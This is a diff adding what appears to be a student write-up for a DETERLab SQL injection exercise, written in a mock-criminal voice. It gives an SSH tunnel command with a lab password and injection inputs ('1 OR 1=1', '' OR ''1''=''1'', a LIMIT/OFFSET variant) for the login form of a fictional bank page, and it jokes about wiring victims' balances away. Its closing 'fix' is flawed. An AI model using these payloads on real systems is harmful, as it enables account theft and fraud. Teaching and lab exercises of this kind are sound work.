@@ -1,0 +1,48 @@
+Transcript:
+
+Hello Boss, I know this is meant for you so I created an alter ego to bring you fear then ACTION.  
+Please, bear with me… Also, on a more serious note, we must fix this immediately, our dollar dollar bills are at stake!
+
+Ready to make some big bucks with the click of a button? I know you’re intrigued and are asking 
+yourself… is this a ploy? Nope. No. Te estoy diciendo la verdad wey, I am telling you the truth dawg, 
+in Spanish even.  Here are the steps, and my friend it involves hacking.  Let's get the crime rolling. 
+
+Steps To Glory:
+1. Open up Terminal (or other platform of your preference).
+2. You must establish a ssh tunnel to get access to the compromised server.  Type in this command:
+   ssh -L 8118:server.seb-projecthree.ColoState356.isi.deterlab.net:80
+   Password: pleaseComprimiseMe
+3. Copy and paste the following link into a web browser.
+   http://localhost:8118/cgi-bin/FCCU.php
+4. To hack into the account of the first person on the database, type in the following:
+   Account ID Number:			1 OR 1=1
+   Password (alphanumeric only):	' OR '1'='1
+5. Make a generous contribution to the man that brought you here:
+   Execute a wire transfer with the total balance available to the following bank & routing number.
+   Routing Number: 314159265
+   Account Number 271828182845
+6. Sign out of the account.
+7. To hack into the account of all people on the database, type in the following according to the pseudo code I provided:
+   n = the index of the victim’s confidential information on the database minus one
+   if n == 0 {  execute step 4  }
+   else { 
+      Account ID Number:		 	1 OR (1=1) LIMIT n OFFSET n--
+      Password (alphanumeric only):	' OR '1'='1
+   }
+8. The World is Yours! Go bananas.
+
+
+You want to know how time I spent on this project?
+14 hours.
+
+
+
+Fix The Vulnerability ( Template From:  https://en.wikipedia.org/wiki/SQL_injection )
+$mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
+$query = sprintf("SELECT * FROM accounts WHERE id=‘%i’ AND password='%s'",
+                  $mysqli->real_escape_string($id),
+                  $mysqli->real_escape_string($password));
+$mysqli->query($query);
+
+
+
